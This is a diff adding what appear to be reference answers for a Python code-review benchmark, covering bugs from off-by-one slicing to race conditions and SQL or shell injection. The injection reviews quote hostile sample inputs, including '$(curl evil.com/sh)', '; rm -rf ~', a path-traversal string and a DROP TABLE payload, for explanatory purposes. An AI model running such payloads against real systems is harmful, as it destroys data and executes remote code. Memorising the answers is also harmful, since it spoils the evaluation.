@@ -1,0 +1,274 @@
+t1_off_by_one_slice_BEGIN
+**Off-by-one error.** `items[len(items) - n - 1:]` returns the last `n + 1` items, not the last `n`. For `items = [10, 20, 30, 40, 50]` and `n = 2`, this returns `[30, 40, 50]` instead of `[40, 50]`.
+
+**Fix:**
+```python
+def last_n(items, n):
+    return items[-n:] if n > 0 else []
+```
+
+The `n > 0` guard is necessary because `items[-0:]` is `items[0:]` (the entire list), not an empty slice.
+
+Other issues: no validation for negative `n`, no handling for `n > len(items)` (probably fine, returns whole list), no type hints, no docstring.
+t1_off_by_one_slice_END
+t2_mutable_default_dict_BEGIN
+**Mutable default argument.** `history={}` is created once at function-definition time and shared across every call that omits the `history` argument. Visit counts will leak between unrelated callers — `greet("Alice")` followed by `greet("Bob")` both mutate the same dict.
+
+**Fix:**
+```python
+def greet(name, history=None):
+    if history is None:
+        history = {}
+    history[name] = history.get(name, 0) + 1
+    return f"Hello {name}, visit #{history[name]}"
+```
+
+If a persistent visit counter is actually intended, use a class attribute or module-level dict — don't smuggle state through a default argument. Linters (`ruff` B006, `pylint` W0102) flag this pattern.
+t2_mutable_default_dict_END
+t3_command_injection_BEGIN
+**Critical: shell command injection.** `directory` is attacker-controlled (web form) and interpolated directly into a `shell=True` command. Input like `; rm -rf ~` or `$(curl evil.com/sh)` executes arbitrary commands with the application's privileges.
+
+**Fix:** Drop the shell entirely:
+```python
+import os
+def list_files(directory: str) -> list[str]:
+    return os.listdir(directory)
+```
+
+If you must invoke `ls`, pass argv as a list (no shell interpretation):
+```python
+subprocess.run(["ls", "--", directory], capture_output=True, text=True, check=True)
+```
+
+Either way, validate `directory` against an allowlist or constrain it to a known root with `os.path.realpath` to prevent path traversal (`../../etc/passwd`).
+t3_command_injection_END
+t4_forgotten_await_BEGIN
+Two issues:
+
+**1. Missing `await`.** `httpx.AsyncClient().get(...)` returns a coroutine, not a `Response`. `response.json()` will raise `AttributeError: 'coroutine' object has no attribute 'json'` and Python will warn "coroutine was never awaited".
+
+**2. Client leak.** `httpx.AsyncClient()` is instantiated but never closed. Each call leaks the underlying connection pool — and constructing a fresh client per call defeats pooling entirely.
+
+**Fix:**
+```python
+async def fetch_user(user_id):
+    async with httpx.AsyncClient() as client:
+        response = await client.get(f"/users/{user_id}")
+        response.raise_for_status()
+        return response.json()
+```
+
+For production, prefer injecting a long-lived `AsyncClient` so connections are reused. Also note: `f"/users/{user_id}"` is a relative path — the client needs `base_url` set or the request will fail.
+t4_forgotten_await_END
+t5_dict_iter_mutation_BEGIN
+**`RuntimeError: dictionary changed size during iteration`.** `del d[key]` while iterating raises on the next loop step in CPython.
+
+**Fix — iterate over a snapshot:**
+```python
+def remove_negatives(d):
+    for key in list(d):
+        if d[key] < 0:
+            del d[key]
+    return d
+```
+
+**Or, more idiomatic — return a new dict:**
+```python
+def remove_negatives(d):
+    return {k: v for k, v in d.items() if v >= 0}
+```
+
+The comprehension is preferable unless callers depend on in-place mutation. Also: returning a dict that you mutated (the original code does both) is confusing — pick one contract.
+t5_dict_iter_mutation_END
+t6_clean_code_BEGIN
+No bugs. The function correctly clamps `value` to `[lo, hi]`, validates the bounds, and uses the standard idiom `max(lo, min(value, hi))`.
+
+Optional polish (not bugs):
+- A one-line docstring would document the `lo > hi` behavior.
+- NaN handling depends on argument order to `min`/`max`; if NaN inputs are possible, decide explicitly (raise, or treat as `lo`).
+- The signature accepts `int` too via PEP 484 numeric tower — probably intentional.
+
+Ship it.
+t6_clean_code_END
+c1_factorial_BEGIN
+**`range(n)` starts at 0**, so `result *= 0` on the first iteration makes `factorial(n)` always return 0 for any `n >= 1`. `factorial(0)` returns 1 by accident (the loop doesn't execute), and negative `n` silently returns 1.
+
+**Fix:**
+```python
+def factorial(n: int) -> int:
+    if n < 0:
+        raise ValueError(f"factorial undefined for n={n}")
+    result = 1
+    for i in range(2, n + 1):
+        result *= i
+    return result
+```
+
+Or just use `math.factorial(n)` — implemented in C, validates input, handles edge cases.
+c1_factorial_END
+c2_counter_race_BEGIN
+**Race condition.** `self.count += 1` is not atomic — it compiles to LOAD_ATTR, LOAD_CONST, BINARY_ADD, STORE_ATTR. The interpreter can switch threads between any of these bytecodes (and under PEP 703 free-threading there's no GIL serialization at all). Concurrent increments lose updates.
+
+**Fix:**
+```python
+import threading
+
+class Counter:
+    def __init__(self):
+        self._count = 0
+        self._lock = threading.Lock()
+
+    def increment(self) -> None:
+        with self._lock:
+            self._count += 1
+
+    @property
+    def count(self) -> int:
+        with self._lock:
+            return self._count
+```
+
+Alternatives: `itertools.count()` (whose `__next__` is atomic in CPython) or `multiprocessing.Value` for cross-process counters.
+c2_counter_race_END
+c3_sql_injection_BEGIN
+**Critical: SQL injection.** `user_input` is concatenated directly into the query. An input like `' OR '1'='1` returns every row; `'; DROP TABLE users; --` (if multi-statement is enabled by the driver) destroys the table.
+
+**Fix — parameterize:**
+```python
+cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))
+```
+
+(Placeholder syntax depends on the driver: `?` for sqlite3, `%s` for psycopg2/MySQLdb.)
+
+Never use string formatting (`+`, f-strings, `%`, `.format`) to build SQL with untrusted input — they're all equally vulnerable. The driver handles escaping correctly when you pass values as parameters. For dynamic identifiers (table/column names, which can't be parameterized), validate against an allowlist.
+c3_sql_injection_END
+c4_file_leak_BEGIN
+**File handle leak.** `f` is never closed. CPython's reference counting may close it promptly when `f` goes out of scope, but that's implementation-defined behavior; PyPy/Jython use generational GC and the descriptor can stay open arbitrarily long. On Windows, this also holds a file lock.
+
+**Fix — context manager:**
+```python
+def process_file(path):
+    with open(path, encoding="utf-8") as f:
+        return f.read()
+```
+
+Always specify `encoding=` explicitly — `open()` without it uses the platform default (`cp1252` on Windows, UTF-8 on Linux), which silently corrupts non-ASCII data when files cross platforms.
+
+Also: `process_file` doesn't actually process anything; consider renaming to `read_file`. For very large files, prefer streaming over `.read()`.
+c4_file_leak_END
+c5_n_plus_1_BEGIN
+Two distinct bugs on the same line:
+
+**1. N+1 query.** One `SELECT` per user. For 1,000 users, 1,000 round trips — a classic latency disaster.
+
+**2. SQL injection.** `f"... {u.id}"` interpolates `u.id` directly. Even if `u.id` is currently trusted, the pattern leaks into copy-paste reuse and breaks the moment `id` becomes user-derived.
+
+**Fix — single parameterized query + in-memory grouping:**
+```python
+from collections import defaultdict
+
+def get_users_with_posts(users):
+    if not users:
+        return []
+    ids = [u.id for u in users]
+    placeholders = ",".join(["?"] * len(ids))
+    rows = db.query(
+        f"SELECT * FROM posts WHERE user_id IN ({placeholders})",
+        ids,
+    )
+    by_user = defaultdict(list)
+    for r in rows:
+        by_user[r.user_id].append(r)
+    return [{"user": u, "posts": by_user[u.id]} for u in users]
+```
+
+The `IN (?, ?, ...)` placeholders are parameterized; the count is derived from a trusted length. For ORM users, prefer eager loading (`selectinload` in SQLAlchemy, `prefetch_related` in Django).
+c5_n_plus_1_END
+c6_ordered_check_BEGIN
+Three issues:
+
+**1. `assert` for runtime validation is unsafe.** `python -O` strips assert statements — all checks silently disappear in optimized production runs. Invalid orders pass through.
+
+**2. KeyError instead of clear validation error.** Line 2 reads `order['total']` before line 3 confirms `'customer_id'` exists. If `'total'` is missing, the caller gets `KeyError` instead of a useful error message — and the existence checks are in the wrong order relative to the value checks.
+
+**3. No error messages.** `assert order['total'] > 0` raises `AssertionError` with no context.
+
+**Fix:**
+```python
+def validate_order(order: dict) -> None:
+    for field in ("customer_id", "total", "items"):
+        if field not in order:
+            raise ValueError(f"missing required field: {field}")
+    if order["total"] <= 0:
+        raise ValueError(f"total must be positive, got {order['total']!r}")
+    if not order["items"]:
+        raise ValueError("items must be non-empty")
+```
+
+For anything beyond toy validation, reach for `pydantic` or `dataclasses` + a validator.
+c6_ordered_check_END
+c7_concat_loop_BEGIN
+**Quadratic-time string concatenation.** Strings are immutable — each `result += ...` allocates a new string and copies the accumulated content. For `n` lines totalling `k` characters, this is O(n·k) at best and O(k²) for long strings.
+
+CPython has an optimization that makes `+=` on a string with refcount 1 mutate in place, but it's fragile (breaks if the string is referenced elsewhere) and absent on PyPy/Jython. Don't rely on it.
+
+**Fix:**
+```python
+def join_lines(lines):
+    return '\n'.join(lines) + '\n' if lines else ''
+```
+
+`str.join` computes the total length once, allocates once, copies once — true O(n).
+
+The original always appends a trailing `\n` (even after the last line); the fix preserves that, with a guard for empty input. If the trailing newline isn't intentional, drop the `+ '\n'` and the guard becomes unnecessary.
+c7_concat_loop_END
+c8_mutable_default_BEGIN
+**Mutable default argument.** `log: list = []` is created once at function-definition time. Every call that omits `log` shares the same list — events accumulate across unrelated callers.
+
+```python
+add_event("a")  # ['a']
+add_event("b")  # ['a', 'b']  -- not what most callers expect
+```
+
+**Fix:**
+```python
+def add_event(event: str, log: list[str] | None = None) -> list[str]:
+    if log is None:
+        log = []
+    log.append(event)
+    return log
+```
+
+Same family of bug as `t2_mutable_default_dict`. Linters (`ruff` B006) catch it. Also: returning a list that you also mutated in place (when `log` is passed) is confusing — pick one contract (mutate or return-new, not both).
+c8_mutable_default_END
+c9_late_binding_BEGIN
+**Late-binding closure.** The lambda captures the variable `v`, not its value. By the time any callback runs, the loop has completed and `v` is bound to the final value (`3`). All three callbacks print `3`.
+
+**Fix — bind eagerly via default argument:**
+```python
+def make_callbacks(values):
+    callbacks = []
+    for v in values:
+        callbacks.append(lambda v=v: print(v))
+    return callbacks
+```
+
+Default arguments are evaluated at lambda-definition time, capturing the current value of `v`.
+
+**Or, factory function:**
+```python
+def make_callbacks(values):
+    def make_one(v):
+        return lambda: print(v)
+    return [make_one(v) for v in values]
+```
+
+Linters catch this: `pylint` W0640 (cell-var-from-loop), `ruff` B023 (function-uses-loop-variable).
+c9_late_binding_END
+c10_clean_code_BEGIN
+No bugs. The function correctly computes a sum-mod-256 checksum over the byte sequence. Type annotations are correct, control flow is simple, and behavior is deterministic.
+
+Optional simplification (not a bug fix): `return sum(data) % 256` is equivalent (modular addition is associative), shorter, and faster because `sum` runs the loop in C.
+
+Naming nit: "checksum" is generic — there are many algorithms (Internet checksum, Fletcher, Adler-32, CRC variants). A docstring naming the specific algorithm would help future readers. For real integrity verification, this 8-bit additive sum has poor collision resistance — prefer `zlib.crc32` or `hashlib.sha256`.
+c10_clean_code_END
